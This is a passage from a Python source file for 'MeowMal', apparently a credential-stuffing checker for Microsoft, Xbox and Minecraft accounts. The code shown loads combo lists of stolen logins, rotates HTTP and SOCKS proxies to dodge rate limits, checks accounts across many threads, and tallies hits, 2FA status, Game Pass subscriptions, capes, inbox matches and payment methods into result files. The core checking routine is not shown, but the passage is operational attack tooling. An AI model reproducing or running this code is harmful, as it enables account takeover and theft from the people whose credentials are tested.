        traceback.print_exc()
        if config.get('proxylessban') is False and config.get('hypixelban') is True:
            if config.get('differentproxy'):
                print(f'\n{Fore.LIGHTBLUE_EX}Select your SOCKS5 Ban Checking Proxies.{Fore.RESET}')
                banproxyload()
            else:
                banproxies.extend(proxylist)
    thread = int(config.get('threads', 50))
    print(f'{Fore.CYAN}✓ Thread count set to: {thread}{Fore.RESET}')
    optimize_network = config.get('optimize_network', True)
    if optimize_network:
        timeout = get_optimized_timeout(config)
        print(f'{Fore.GREEN}✓ Network optimization: ENABLED (timeout: {timeout}){Fore.RESET}\n')
    else:
        print(f'{Fore.YELLOW}⚠ Network optimization: DISABLED{Fore.RESET}\n')
    Proxys()
    print(f"{Fore.BLUE}{'=' * 60}")
    print(f'{Fore.CYAN}📁 LOAD COMBO FILE')
    print(f"{Fore.BLUE}{'=' * 60}{Fore.RESET}")
    Load()
    if not Combos:
        print(f'{Fore.BLUE}No combos loaded. Exiting...{Fore.RESET}')
        time.sleep(2)
        return
    if not os.path.exists('results'):
        os.makedirs('results/')
    timestamp = datetime.now().strftime('%Y-%m-%d_%H%M%S')
    fname = timestamp
    if not os.path.exists(f'results/{fname}'):
        os.makedirs(f'results/{fname}')
        open(f'results/{fname}/donut_stats.txt', 'a', encoding='utf-8').close()
    print(f'\n{Fore.GREEN}Starting checker...{Fore.RESET}')
    print(f'{Fore.CYAN}Results will be saved to: results/{fname}{Fore.RESET}\n')
    try:
        threading.Thread(target=logscreen, daemon=True).start()
        print(f'{Fore.GREEN}Checking {len(Combos)} accounts with {thread} threads...{Fore.RESET}\n')
        if UI_ENABLED and ui:
            ui.start_checking(len(Combos))
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            future_to_combo = {executor.submit(Checker, combo): combo for combo in Combos}
            processed_count = 0
            
            try:
                for future in concurrent.futures.as_completed(future_to_combo):
                    combo = future_to_combo[future]
                    processed_count += 1
                    try:
                        future.result()
                    except Exception as e:
                        with stats_lock:
                            errors += 1
                            bad += 1
                            checked += 1
                            cpm += 1
                        if UI_ENABLED and ui:
                            ui.log_error(f'Error: {str(e)[:50]}')
                        else:
                            print(f'{Fore.RED}Worker error: {str(e)[:50]}{Fore.RESET}')
                    
                    if processed_count % 1000 == 0:
                        import gc
                        gc.collect()
            except Exception as e:
                 if UI_ENABLED and ui:
                     ui.log_error(f"Processing error: {e}")
        print(f"\n{Fore.CYAN}{'=' * 60}")
        print(f'{Fore.YELLOW}⏳ Collecting Final Live Stats...')
        print(f"{Fore.CYAN}{'=' * 60}{Fore.RESET}\n")
        if UI_ENABLED and ui:
            ui.log_info(f'⏳ Collecting Final Live Stats...')
        for countdown in range(5, 0, -1):
            print(f'{Fore.YELLOW}⏳ Collecting Live Stats... {countdown}s remaining{Fore.RESET}', end='\r')
            try:
                utils.set_title(f'⏳ Collecting Live Stats... {countdown}s | Hits: {hits} - Bad: {bad} - 2FA: {twofa} - CPM: {cpm1 * 60}')
            except:
                pass
            if UI_ENABLED and ui:
                ui.log_info(f'⏳ Collecting Live Stats... {countdown}s remaining')
                ui.update_stats(hits=hits, bad=bad, twofa=twofa, valid_mail=vm, xgp=xgp, xgpu=xgpu, other=other, mfa=mfa, sfa=sfa, minecraft_capes=minecraft_capes, optifine_capes=optifine_capes, inbox_matches=inbox_matches, name_changes=name_changes, payment_methods=payment_methods, checked=checked, total=len(Combos), cpm=cpm1 * 60, retries=retries, errors=errors)
                ui.show_ui_screen()
        try:
            hits_file = f'results/{fname}/Hits.txt'
            if os.path.exists(hits_file):
                with open(hits_file, 'r', encoding='utf-8', errors='ignore') as hf:
                    file_hits = sum((1 for line in hf if line.strip()))
                with stats_lock:
                    if file_hits > hits:
                        hits = file_hits
        except Exception:
            pass
        print(f"\r{' ' * 80}\r", end='')
        print(f'{Fore.GREEN}✅ Live Stats Collected!{Fore.RESET}\n')
        print(f"{Fore.CYAN}{'=' * 60}")
        print(f'{Fore.YELLOW}Final Results:')
        print(f'{Fore.GREEN}   Hits: {hits} {Fore.WHITE}| {Fore.RED}Bad: {bad} {Fore.WHITE}| {Fore.MAGENTA}2FA: {twofa} {Fore.WHITE}| {Fore.GREEN}MFA: {mfa} {Fore.WHITE}| {Fore.YELLOW}SFA: {sfa}')
        print(f'{Fore.LIGHTCYAN_EX}   XGP: {xgp} {Fore.WHITE}| {Fore.CYAN}XGPU: {xgpu} {Fore.WHITE}| {Fore.LIGHTYELLOW_EX}Other: {other} {Fore.WHITE}| {Fore.CYAN}Valid Mail: {vm}')
        print(f"{Fore.CYAN}{'=' * 60}{Fore.RESET}\n")
        if UI_ENABLED and ui:
            ui.log_info(f'✅ Live Stats Collected! Final Results:')
            ui.log_info(f'   Hits: {hits} | Bad: {bad} | 2FA: {twofa} | MFA: {mfa} | SFA: {sfa}')
            ui.log_info(f'   XGP: {xgp} | XGPU: {xgpu} | Other: {other} | Valid Mail: {vm}')
        if UI_ENABLED and ui:
            ui.show_finished_screen(f'results/{fname}')
        else:
            print(f"\n{Fore.GREEN}{'=' * 60}")
            print(f'{Fore.YELLOW}Checking Completed!')
            print(f"{Fore.GREEN}{'=' * 60}")
            print(f'{Fore.WHITE}Total Checked: {checked}')
            print(f'{Fore.GREEN}Hits: {hits}')
            print(f'{Fore.RED}Bad: {bad}')
            print(f'{Fore.MAGENTA}2FA: {twofa}')
            print(f'{Fore.CYAN}Valid Mail: {vm}')
            print(f'{Fore.LIGHTCYAN_EX}Xbox Game Pass Ultimate: {xgpu}')
            print(f'{Fore.LIGHTBLUE_EX}Xbox Game Pass: {xgp}')
            print(f'{Fore.GREEN}MFA: {mfa}')
            print(f'{Fore.YELLOW}SFA: {sfa}')
            print(f'{Fore.LIGHTYELLOW_EX}Other: {other}')
            print(f'{Fore.CYAN}Results saved to: results/{fname}')
            print(f"{Fore.GREEN}{'=' * 60}{Fore.RESET}\n")
        try:
            input('Press Enter to exit...')
        except EOFError:
            pass
    except KeyboardInterrupt:
        print(f'\n\n{Fore.YELLOW}Checker interrupted by user.{Fore.RESET}')
        if UI_ENABLED and ui:
            ui.show_finished_screen(f'results/{fname}' if fname else 'results/interrupted')
    except Exception as e:
        print(f'\n{Fore.RED}Error: {str(e)}{Fore.RESET}')
        if UI_ENABLED and ui:
            ui.show_error_screen(str(e))
        traceback.print_exc()
        try:
            input('Press Enter to exit...')
        except EOFError:
            pass
    finally:
        print(f'\n{Fore.CYAN}Thank you for using MeowMal! 🐱{Fore.RESET}\n')
def detect_proxy_protocol(proxies_list):
    if not proxies_list:
        return '4'
    print(f'{Fore.BLUE}🔍 Detecting proxy type...{Fore.RESET}')
    protocols = [('socks5', '3'), ('socks4', '2'), ('http', '1')]
    max_checks = min(3, len(proxies_list))
    for i in range(max_checks):
        test_proxy = proxies_list[i]
        for scheme, type_code in protocols:
            try:
                proxy_url = f'{scheme}://{test_proxy}'
                proxies = {'http': proxy_url, 'https': proxy_url}
                response = requests.get('http://www.google.com', proxies=proxies, timeout=2)
                if response.status_code == 200:
                    print(f'{Fore.CYAN}✓ Detected {scheme.upper()} proxy{Fore.RESET}')
                    return type_code
            except:
                continue
    print(f'{Fore.BLUE}ℹ Defaulting to HTTP proxy type.{Fore.RESET}')
    return '1'
def Proxys():
    global proxylist, proxytype, auto_proxy, proxy_api_url, proxy_request_num, proxy_time
    print(f"\n{Fore.BLUE}{'=' * 60}")
    print(f'{Fore.CYAN}AUTO LOAD PROXY FILE')
    print(f"{Fore.BLUE}{'=' * 60}{Fore.RESET}")
    filename = 'proxies.txt'
    if not os.path.exists(filename):
        print(f"{Fore.BLUE}⚠ 'proxies.txt' not found.{Fore.RESET}")
        print(f'{Fore.BLUE}Continuing without proxies (Proxyless Mode).{Fore.RESET}')
        proxytype = "'4'"
        return
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            proxylist = [line.strip() for line in f if line.strip()]
        if not proxylist:
            print(f"{Fore.BLUE}⚠ 'proxies.txt' is empty.{Fore.RESET}")
            proxytype = "'4'"
            return
        print(f'{Fore.CYAN}[{len(proxylist)}] Proxies Loaded.{Fore.RESET}')
        if UI_ENABLED and ui:
            ui.log_info(f'{len(proxylist)} proxies loaded')
        detected_type = detect_proxy_protocol(proxylist)
        proxytype = f"'{detected_type}'"
    except Exception as e:
        print(f'{Fore.LIGHTRED_EX}Error reading proxy file: {str(e)}{Fore.RESET}')
        proxytype = "'4'"
        time.sleep(2)
def banproxyload():
    global banproxies
    print(f"\n{Fore.CYAN}{'=' * 60}")
    print(f'{Fore.YELLOW}Load Ban Checking Proxy File (SOCKS5)')
    print(f"{Fore.CYAN}{'=' * 60}{Fore.RESET}")
    filename = None
    default_file = 'banproxies.txt'
    if os.path.exists(default_file):
        print(f'{Fore.GREEN}Found {default_file} in current directory!{Fore.RESET}')
        try:
            use_default = input(f'{Fore.YELLOW}Use this file? (Y/n): {Fore.RESET}').strip().lower()
        except EOFError:
            use_default = 'y'
        if use_default != 'n':
            filename = default_file
    if filename is None:
        try:
            filename = input(f'{Fore.CYAN}Load Ban Proxy: {Fore.RESET}').strip()
        except EOFError:
            pass
        filename = filename.strip('"').strip("'")
    if not filename or not os.path.exists(filename):
        print(f"{Fore.LIGHTRED_EX}Invalid file path or file doesn't exist.{Fore.RESET}")
        print(f'{Fore.YELLOW}Continuing without ban checking proxies...{Fore.RESET}')
        return
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            banproxies = [line.strip() for line in f if line.strip()]
        print(f'{Fore.LIGHTBLUE_EX}[{len(banproxies)}] Ban Check Proxies Loaded.{Fore.RESET}')
        if UI_ENABLED and ui:
            ui.log_info(f'{len(banproxies)} SOCKS5 proxies loaded for ban checking')
    except Exception as e:
        print(f'{Fore.LIGHTRED_EX}Error reading ban proxy file: {str(e)}{Fore.RESET}')
        time.sleep(2)
def main():
    Main()
if __name__ == '__main__':
    main()
